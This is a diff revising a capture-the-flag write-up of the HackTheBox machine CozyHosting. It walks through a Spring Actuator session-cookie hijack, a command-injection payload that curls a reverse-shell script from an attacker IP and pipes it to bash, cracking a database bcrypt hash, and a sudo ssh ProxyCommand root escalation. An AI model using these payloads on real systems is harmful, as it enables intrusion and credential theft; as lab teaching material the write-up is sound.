@@ -12,13 +12,13 @@ tags: ["capture the flag", "hackthebox", "web", "networks"]
 
 <aside>
 <a href={link}>{title} @ {author}</a><br/>
-Writeup for this very simple boot-to-root HTB seasonal.
+A straightfoward boot-to-root HackTheBox seasonal machine.
 </aside>
 
 ## Recon
 
-Using `rustscan`, we can perform a very quick port scan to pick up any open ports (which we can pass on to `nmap` for further evaluation if need be). The scan returns open ports on `80` and `22` (HTTP & SSH),
-which is a pretty standard setup for a server hosting some kind of webapp.
+Using `rustscan`, we can perform a very quick port scan to pick up any open ports (which we can pass on to `nmap` for further evaluation if need be).
+The scan returns open ports on 80 and 22 (HTTP & SSH), which is common for servers hosting web applications.
 
 ### HTTP service
 
@@ -30,13 +30,15 @@ A quick google search for this indicates that we are being shown a default error
 
 ![spring.png](/img/cozyhosting_img/spring.png)
 
-[The Spring framework has `Actuator` endpoints](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators) - intended for debugging purposes - though we can gather a lot of useful information (or even vulnerability-dependent code execution) if they are available to us.  The `/actuator` route tells us that a handful of debugging endpoints are enabled, and we're able to access *most* of them.
+[The Spring framework has `Actuator` endpoints](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators) - intended for debugging purposes - though we can gather a lot of useful information (or even vulnerability-dependent code execution)
+if they are available to us.  The `/actuator` route tells us that a handful of debugging endpoints are enabled, and we're able to access *most* of them.
 
 ![actuator_dir.png](/img/cozyhosting_img/actuator_dir.png)
 
-Enumerating each endpoint meant simply navigating to the URI, looking over the content, and trying to utilize any relevant information in some kind of request. This strategy seems like it was the best route here, as trying to write a script to automate keyword collection or something would likely be far less efficient.
+Enumerating each endpoint involved navigating to the URI, examining the content, and attempting to utilize any relevant information in requests. This strategy seems like it was the best route here, as trying to write a script to automate keyword collection
+would likely be far less efficient given I'm not entirely sure what I'm looking for.
 
-We wind up on the `/actuator/mappings` endpoint (which displays a list of directories), where we notice a route to a ‘sessions’ endpoint - this might display a list of logged in users, for example.
+We arrive at the /actuator/mappings endpoint, which lists application mappings. Among these, we notice a route to a ‘sessions’ endpoint, potentially revealing active session information.
 
 ![mappings.png](/img/cozyhosting_img/mappings.png)
 
@@ -46,7 +48,7 @@ On this actuator endpoint, rather than getting ****just**** usernames, we are gi
 
 ![sess](/img/cozyhosting_img/sessions.png)
 
-I'd already replaced my assigned cookie with `kanderson`'s in chrome, but you get the idea
+I had already replaced my assigned cookie with kanderson's in Chrome in the screenshot above, but the concept remains the same.
 
 Impersonating `kanderson`, we can go back to the login page and refresh it to be redirected to the admin dashboard. Here we see an automatic patching tool for an `ssh` service.
 
@@ -68,7 +70,8 @@ So it would seem that not only are we executing a direct command onto the target
 
 The solution I used here was to write a reverse shell script to a file and serve it over a python `http.server`. We can then `curl` its contents from the CMS, and finally pipe to bash to execute it.
 
-This was slightly trickier than simply writing this as a URL-safe sequence, as character encoding like `%20` or `+` broke our commands upon reaching the shell, but we can use the  shell variable`${IFS}` to determine input field separation, which yields our desired word separator here.
+This task was slightly more challenging than writing this as a URL-safe sequence because character encodings such as %20 or + disrupted our commands upon reaching the shell.
+However, we can use the shell variable `${IFS}`, which will evaluate out to the tab, space, and newline characters, allowing us to effectively indicate the border of each command or argument.
 
 ```bash
 host=n&username=%3bcurl${IFS}<http://10.10.14.40:9990/hello.sh|/bin/bash%3b${IFS}>
@@ -115,16 +118,19 @@ spring.datasource.platform=postgres
 spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
 spring.datasource.username=postgres
 spring.datasource.password=Vg&nvzAQ7XxR
-
 ```
 
 ## Privilege escalation
 
-Going back to our `ssh` session, we can connection to the Postgresql database to see what might be available to us. I've never used Postgres like this before, so it was a little cursed, but I ultimately got there:
+Returning to our ssh session, we can connect to the PostgreSQL database to explore available data. I've never used Postgres until this point, so it was a little cursed having to navigate the database by hand, but I ultimately got there:
 
-`$ (remote) app@cozyhosting:/app$ psql -h localhost -U postgres`
 
-```sql
+```bash
+
+$ (remote) app@cozyhosting:/app$ psql -h localhost -U postgres
+
+[...]
+
 postgres=# \\\\list
                                    List of databases
     Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
@@ -162,7 +168,6 @@ cozyhosting=# SELECT name FROM users;
  kanderson
  admin
 (2 rows)
-
 ```
 
 That looks like a `bcrypt` hash, so I will run it through `hashcat` against `rockyou`.
@@ -204,14 +209,13 @@ Hardware.Mon.#1..: Temp: 51c Fan: 19% Util: 97% Core:1923MHz Mem:4006MHz Bus:16
 
 Started: Tue Sep 05 07:20:44 2023
 Stopped: Tue Sep 05 07:20:59 2023
-
 ```
 
 So our gathered credentials from the database are `admin`:`manchesterunited` .
 
-### `user.txt`
+### Privilege Escalation | User
 
-I didn't include a screenshot/terminal output of this, but checking other `ssh` users with `$ cat /etc/passwd` shows `josh` as the second user, so we can infer that the `admin` user is probably .
+After `cat`ing out the `/etc/passwd` file to see users with a `/home` directory, we land on the username `josh`. We can test out the `admin` password for `josh`:
 
 ```bash
 cozyhosting=# exit
@@ -225,7 +229,7 @@ josh@cozyhosting:~$ cat user.txt
 7d21d6bcbd68d25a92908bf5290b1a69
 ```
 
-### `root.txt`
+### Privilege Escalation | Root
 
 Finally, lets see what privilege escalation options might be available to us before enumerating with `linpeas.sh`:
 
@@ -238,7 +242,6 @@ Matching Defaults entries for josh on localhost:
 
 User josh may run the following commands on localhost:
     (root) /usr/bin/ssh *
-
 ```
 
 As we can run the `ssh` binary as `root` with sudo, we can use a pretty simple payload from `gtfobins` to grab our final flag.
@@ -247,8 +250,4 @@ As we can run the `ssh` binary as `root` with sudo, we can use a pretty simple p
 (remote) josh@cozyhosting:/tmp$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 # whoami
 root
-# cat /root/root.txt
-0******************************6
-#
-
 ```
